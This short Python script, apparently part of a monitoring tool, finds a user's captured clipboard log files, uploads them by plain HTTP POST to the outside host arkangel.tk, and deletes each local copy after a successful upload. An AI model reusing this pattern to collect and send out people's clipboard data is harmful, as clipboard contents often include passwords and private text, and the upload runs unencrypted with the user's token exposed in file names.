import requests
import json
import os
from getsqldata import *
from datetime import datetime

uid = getCurrentUser()

email = getRowValue('Users',uid)[1]
token = getRowValue('current_user',uid)[1]

dir_path = dir_path = '..\\Clipboard'


#up website log
#textLogs = os.path.join(dir_path,datetime.now().strftime('%Y_%m_%d-')+email+'-'+token+'.txt')
#print(textLogs)

for file in os.listdir(dir_path):
    if file.endswith(email+'-'+token+".txt"):
        filePath = os.path.join(dir_path, file)
        print(filePath)
        urlweb = 'http://www.arkangel.tk/upload-clipboard-log'
        with open(filePath,'rb') as filedata:
            r = requests.post(urlweb,files={'file':filedata})
            print(r.content)
        if(r.content == b''):
            os.remove(filePath)
            print('success')

